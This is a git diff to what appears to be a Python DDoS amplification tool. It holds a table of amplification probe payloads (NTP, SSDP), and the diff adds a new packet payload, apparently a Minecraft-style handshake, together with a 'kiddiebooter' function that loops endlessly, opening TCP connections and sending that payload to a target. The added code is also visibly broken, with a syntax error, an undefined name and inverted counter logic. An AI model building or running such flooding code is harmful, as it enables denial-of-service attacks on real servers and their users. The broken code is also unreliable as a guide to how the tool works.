@@ -6,7 +6,7 @@ import struct
 import threading
 from random import randint
 from optparse import OptionParser
-from pinject import IP, UDP
+from pinject import IP, UDP, TCP
 
 USAGE = '''
 %prog target.com [options]        # DDoS
@@ -75,7 +75,8 @@ PAYLOAD = {
 		'\x01\x02\x01\x05\x00'),
 	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
 	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
+	'MC':('\x10\x00\xbc\x02\x09\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x63\xdd\x02\x09\x00\x07\x6d\x65\x72\x6b\x33\x36\x30')
 }
 
 amplification = {
@@ -287,7 +288,20 @@ class DDoS(object):
 		sock.close()
 		for proto in _files:
 			_files[proto][FILE_HANDLE].close()
-
+def kiddiebooter(host,port): # Experimental dont use yet 
+	totalsent=0
+	print 'Starting....'
+	while 1:
+		if totalsent < 64:
+			print '64 Packets have been sent'
+			totalsent=0
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		connect=s.connect((host,port))
+		s.settimeout(4500) # Change me
+		setsockopt(SOL_SOCKET., SO_SNDBUF, 5)
+		s.send(PAYLOAD[MC])
+		totalsent=totalsent+1
+		
 def main():
 	parser = OptionParser(usage=USAGE)
 	for args, kwargs in OPTIONS:
